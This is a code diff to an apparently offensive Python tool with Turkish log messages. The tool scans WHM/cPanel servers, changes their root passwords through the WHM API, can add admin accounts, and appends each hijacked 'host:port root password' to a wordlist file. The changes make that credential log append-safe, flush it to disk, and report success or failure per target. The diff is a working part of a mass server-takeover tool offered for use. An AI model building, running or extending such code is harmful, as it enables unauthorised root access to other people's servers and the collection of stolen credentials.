@@ -665,12 +665,18 @@ def append_passwd_wordlist_line(path: str, target_url: str, user: str, password:
         return
     _, host, port = parse_target(target_url)
     line = f"{host}:{port} {user} {password}\n"
-    d = os.path.dirname(os.path.abspath(path))
+    ap = os.path.abspath(path)
+    d = os.path.dirname(ap)
     if d:
         os.makedirs(d, exist_ok=True)
     with PASSWD_APPEND_LOCK:
-        with open(path, "a", encoding="utf-8") as f:
+        with open(ap, "a", encoding="utf-8") as f:
             f.write(line)
+            f.flush()
+            try:
+                os.fsync(f.fileno())
+            except OSError:
+                pass
 
 
 def action_add_admin(ctx, username: str, password: str):
@@ -887,16 +893,21 @@ def scan(target: str, args) -> dict:
             ok, http_s, data = action_change_passwd_result(ctx, args.passwd)
             safe_print(json.dumps(data, indent=2)[:800]
                        if isinstance(data, dict) else str(data)[:800])
+            rsn = (_whm_json_ok_reason(data)[1]
+                   if isinstance(data, dict) else str(data))
             if ok and pw_append_path:
                 append_passwd_wordlist_line(
                     pw_append_path, target, "root", args.passwd)
-                log("API", f"passwd wordlist append → {pw_append_path}")
+                _, hh, pp = parse_target(target)
+                log("OK", f"passwd API başarılı → wordlist +1  {hh}:{pp}")
+            elif pw_append_path and not ok:
+                log("WARN",
+                    f"passwd API başarısız (wordlist yok): {target} — "
+                    f"{rsn[:160]}")
             pw_ok = getattr(args, "_bulk_passwd_successes", None)
             if pw_ok is not None:
                 ver = (result.get("finding") or {}).get("version")
                 ts = datetime.now().isoformat()
-                rsn = (_whm_json_ok_reason(data)[1]
-                       if isinstance(data, dict) else str(data))
                 with BULK_RECORD_LOCK:
                     if ok:
                         pw_ok.append({
@@ -1095,13 +1106,14 @@ def save_bulk_passwd_reports(ok_list, fail_list, path_ok, path_fail, password):
     d_ok = os.path.dirname(os.path.abspath(path_ok))
     if d_ok:
         os.makedirs(d_ok, exist_ok=True)
-    with open(path_ok, "w", encoding="utf-8") as f:
+    with open(path_ok, "a", encoding="utf-8") as f:
         for ent in ok_list:
             turl = ent.get("target") or ""
             _, host, port = parse_target(turl)
             user = ent.get("user") or "root"
             f.write(f"{host}:{port} {user} {password}\n")
-    log("OK", f"Root passwd OK wordlist ({len(ok_list)} satır) → {path_ok}")
+        f.flush()
+    log("OK", f"Root passwd OK wordlist (+{len(ok_list)} satır, append) → {path_ok}")
 
     d_fail = os.path.dirname(os.path.abspath(path_fail))
     if d_fail:
@@ -1507,7 +1519,8 @@ Toplu root şifre (results.json → WHM passwd; başarılar wordlist .txt):
     print(f"   Action   : {args.action or 'scan only'}")
     pwl = (getattr(args, "passwd_append_wordlist", None) or "").strip()
     if pwl:
-        print(f"   Passwd + : {pwl}  (append wordlist, çoklu hedefte passwd)")
+        args.passwd_append_wordlist = os.path.abspath(pwl)
+        print(f"   Passwd + : {args.passwd_append_wordlist}  (append wordlist)")
     print()
 
     if pwl and (args.action or "").lower() != "passwd":
